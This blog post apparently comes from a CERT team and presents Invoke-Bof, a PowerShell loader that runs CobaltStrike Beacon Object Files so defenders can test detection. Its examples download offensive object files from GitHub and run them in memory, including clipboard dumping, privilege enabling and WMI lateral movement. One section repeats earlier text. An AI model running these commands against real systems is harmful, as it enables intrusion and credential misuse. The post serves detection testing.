---
title: "Invoke-Bof"
date: 2021-12-08T09:22:42+02:00
Summary: Invoke-Bof, Is it a kind of purple software?
---

CobaltStrike seems to become more and more the best offensive framework, used by most of the RED side of cybersecurity.

The framework is very extensible and allows Red Teamers to develop specific offensive modules named BOF, short for Beacon Object File. Beacons are what CobaltStrike calls their agents, or final payloads.

A Beacon Object File is split into two parts:

A payload that will be executed on the victim machine
An aggressor script, which will prepare and interact with the payload
Many Red Teams publish BOFs on their public GitHub repositories, implementing lateral movement, vulnerability, attack, or persistence. Instead of reimplementing these techniques each time we want to try and detect them, we decided to find a way to execute them directly.

We decided to implement a BOF loader in powershell, [invoke-Bof](https://github.com/airbus-cert/Invoke-Bof) to be easily included in any framework, and especially the wonrdeful work done by Redcanary with [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) !!!

# What Is a BOF payload?

A BOF payload is simply an object file produced by any C compiler. An Object file is an intermediate file where the linking part is not yet done. So in essence, a BOF payload is written in C!

As the linker is not done, no API call is resolved, and that is the genius of the CobalStrike developers! The linking process will be done directly during the loading step on the victim machine. It saves a lot of space and keeps the BOF very small!

Intermediate object files are not PE files, but in COFF format. The COFF format includes enough information to load and execute the payload:

- Section Size and rights
- Symbols, especially exported function names
- Relocation information

Most of the time, a BOF file needs to interact with the C&C, so CobaltStrike offers a dedicated API:

- BeaconFormatXXX for format API used to send raw information to the C&C
- BeaconDataXXX is used to retrieve information from the C&C
- BeaconPrintf and BeaconOutput is used to send information to C&C

Many other offensive APIs, to perform process manipulation, token manipulation etc...
So here is the challenge, as Powershell is a managed language, which means it is executed using CLR (Common Language Runtime) in Windows, we need to perform a smart interface to switch from managed to unmanaged and from unmanaged to managed world.

# Managed to Unmanaged

A BOF payload is simply an object file produced by any C compiler. An Object file is an intermediate file where the linking part is not yet done. So in essence, a BOF payload is written in C!

As the linker is not done, no API call is resolved, and that is the genius of the CobalStrike developers! The linking process will be done directly during the loading step on the victim machine. It saves a lot of space and keeps the BOF very small!

Intermediate object files are not PE files, but in COFF format. The COFF format includes enough information to load and execute the payload:

* Section Size and rights
* Symbols, especially exported function names
* Relocation information

Most of the time, a BOF file needs to interact with the C&C, so CobaltStrike offers a dedicated API:

* `BeaconFormatXXX` for format API use to send raw information to the C&C
* `BeaconDataXXX` is used to retrieve information from the C&C
* `BeaconPrintf` and `BeaconOutput` is used to send information to C&C
* Many other offensive APIs, to perform process manipulation, token manipulation etc...

So here is the challenge, as Powershell is a managed language, which means it is executed using CLR (Common Language Runtime) in Windows, we need to perform a smart interface to switch from managed to unmanaged and from unmanaged to managed world.

# Unmanaged to managed

Now we can launch our beacon, but there is the interaction between the unmanaged and managed world. For example, the Beacon API is used by many beacon developers to perform parameter unmarshalling, or send information to the C&C.

The main problem is finding a way to declare a typed function that can be easily marshaled by the CLR.

The solution comes directly from Powershell itself, by providing a way to declare a typed function. It’s a feature introduced in Powershell 5.0, so it’s an allowed restriction.

```powershell
class BeaconAPI {
	static [void] BeaconDataParse([IntPtr] $Parser, [IntPtr] $Buffer, [int] $Size)
	{
		$ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
		$ParserObject.original = $Buffer
		$ParserObject.buffer = $Buffer
		$ParserObject.size = $Size
		$ParserObject.length = 0
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
	}
}

$BeaconAPI = New-Object System.Object

$BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
$BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataParse -Value ($BeaconDataParseDelegate)
```

Last, but not least, limitation comes from CLR. The Beacon API uses a lot of varargs functions (the ones that end with `...`), especially BeaconPrintf API. So as CLR can’t handle varargs as C API does, and once we are in the managed world we no longer have access to the original stack, we can only rely on the register parameters. 
In x64 the calling convention uses registers for the fourth first parameter, so as BeaconPrintf uses the first for the logging level, and the second for the string format, we only have two possibles varargs arguments.
Most of the developers only use one or two varargs arguments, so it’s an acceptable limitation.

# Example of use case

## Dump clipboard

Now we can launch every beacon available from Github. For example, we can test a beacon that dumps our clipboard:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go



██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by CERT https://github.com/airbus-cert]



[+] Mapping of .text    at  0x133e0c20000
[+] Mapping of .rdata   at  0x133e0c30000
[+] Mapping of .xdata   at  0x133e0c40000
[+] Mapping of .pdata   at  0x133e0c50000
[+] Mapping of /4       at  0x133e0c60000
[+] Jump into beacon at 0x133e0c20000
****************************************************************************
[+] Clipboard updated !
[!]Active Windows : Windows PowerShell ISE
[!] Content : $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
Invoke-Bof -BOFBytes $BOFBytes  -EntryPoint go
----------------------------------

****************************************************************************

```

## Enable privileges
We can try to detect an attacker that tries to enable *SE_DEBUG* privilege:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/EspressoCake/Toggle_Token_Privileges_BOF/raw/main/dist/toggle_privileges_bof.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint enable -ArgumentList 20



██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by Aircraft Company CERT https://github.com/airbus-cert]



[+] Mapping of .text    at  0x133e0ab0000
[+] Mapping of .data    at  0x133e0bf0000
[+] Mapping of .xdata   at  0x133e0c20000
[+] Mapping of .pdata   at  0x133e0c30000
[+] Mapping of .rdata   at  0x133e0c40000
[+] Mapping of /4       at  0x133e0c50000
[+] Jump into beacon at 0x133e0ab0c10
****************************************************************************
Authors:
	@the_bit_diddler
	@hackersoup

You are not currently in an administrative session. Come again later!

****************************************************************************


```

## Lateral movement using WMI
You want to execute a process using WMI create process:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/Yaxser/CobaltStrike-BOF/raw/master/WMI%20Lateral%20Movement/ProcCreate.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\COMPUTER\ROOT\CIMV2","domain","username","username","cmd.exe /C powershell.exe",1 -UnicodeStringParameter


██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝

  [v0.1 Made with love by Aircraft Company CERT https://github.com/airbus-cert]



[+] Mapping of .text at  0x2e940940000
[+] Mapping of /4 at  0x2e95a880000
[+] Mapping of /30 at  0x2e95a890000
[+] Mapping of /57 at  0x2e95a8f0000
[+] Mapping of /84 at  0x2e95a900000
[+] Mapping of /110 at  0x2e95b160000
[+] Mapping of /137 at  0x2e95b170000
[+] Mapping of /164 at  0x2e95b180000
[+] Mapping of /193 at  0x2e95b190000
[+] Mapping of /223 at  0x2e95b1a0000
[+] Mapping of .xdata at  0x2e95b1b0000
[+] Mapping of .pdata at  0x2e95b1c0000
[+] Mapping of .rdata at  0x2e95b1d0000
[+] Mapping of /253 at  0x2e95b1e0000
[+] Mapping of /277 at  0x2e95b1f0000
[+] Mapping of /301 at  0x2e95b200000
[+] Mapping of /325 at  0x2e95b230000
[!] Unable to parse API name :  _ZTV10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_error4DtorEv  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  __imp_LocalFree  /!\ continue without resolving /!\
[!] Unable to parse API name :  _Unwind_Resume  /!\ continue without resolving /!\
[!] Unable to parse API name :  __cxa_call_unexpected  /!\ continue without resolving /!\
[!] Unable to parse API name :  __gxx_personality_seh0  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTI10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD0Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTVN10__cxxabiv117__class_type_infoE  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTS10_com_error  /!\ continue without resolving /!\
[+] Jump into beacon at 0x2e940940181
****************************************************************************
ExecMethod Succeeded!
****************************************************************************
```

## Dump permission of a pipe



```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/boku7/xPipe/raw/main/xpipe.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\.\pipe\lsass" -UnicodeStringParameter


██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝

  [v0.1 Make with love by Aircraft Company CERT https://github.com/airbus-cert]



[+] Mapping of .text at  0x16e54590000
[+] Mapping of .rdata at  0x16e545a0000
[+] Mapping of .xdata at  0x16e545b0000
[+] Mapping of .pdata at  0x16e54610000
[+] Mapping of /4 at  0x16e54620000
[+] Jump into beacon at 0x16e5459081c
****************************************************************************
=============================== Beacon Output ==============================
00000000   50 69 70 65 3A 20 5C 0A 4F 77 6E 65 72 3A 20 73  Pipe: \.Owner: s
00000010   79 6C 76 61 69 6E 5C 43 4F 53 4D 4F 53 0A 41 64  ylvain\COSMOS.Ad
00000020   6D 69 6E 69 73 74 72 61 74 6F 72 73 5C 42 55 49  ministrators\BUI
00000030   4C 54 49 4E 0A 20 20 20 2B 20 46 49 4C 45 5F 41  LTIN.   + FILE_A
00000040   4C 4C 5F 41 43 43 45 53 53 0A 53 59 53 54 45 4D  LL_ACCESS.SYSTEM
00000050   5C 4E 54 20 41 55 54 48 4F 52 49 54 59 0A 20 20  \NT AUTHORITY.
00000060   20 2B 20 46 49 4C 45 5F 41 4C 4C 5F 41 43 43 45   + FILE_ALL_ACCE
00000070   53 53 0A 55 73 65 72 73 5C 42 55 49 4C 54 49 4E  SS.Users\BUILTIN
00000080   0A 20 20 20 2B 20 53 59 4E 43 48 52 4F 4E 49 5A  .   + SYNCHRONIZ
00000090   45 0A 20 20 20 2B 20 52 45 41 44 5F 43 4F 4E 54  E.   + READ_CONT
000000A0   52 4F 4C 0A 20 20 20 2B 20 46 49 4C 45 5F 52 45  ROL.   + FILE_RE
000000B0   41 44 5F 44 41 54 41 0A 20 20 20 2B 20 46 49 4C  AD_DATA.   + FIL
000000C0   45 5F 52 45 41 44 5F 41 54 54 52 49 42 55 54 45  E_READ_ATTRIBUTE
000000D0   53 0A 41 75 74 68 65 6E 74 69 63 61 74 65 64 20  S.Authenticated
000000E0   55 73 65 72 73 5C 4E 54 20 41 55 54 48 4F 52 49  Users\NT AUTHORI
000000F0   54 59 0A 41 75 74 68 65 6E 74 69 63 61 74 65 64  TY.Authenticated
00000100   20 55 73 65 72 73 5C 4E 54 20 41 55 54 48 4F 52   Users\NT AUTHOR
00000110   49 54 59 0A 20 20 20 2B 20 46 49 4C 45 5F 43 52  ITY.   + FILE_CR
00000120   45 41 54 45 5F 50 49 50 45 5F 49 4E 53 54 41 4E  EATE_PIPE_INSTAN
00000130   43 45 0A                                         CE.
============================================================================
****************************************************************************
```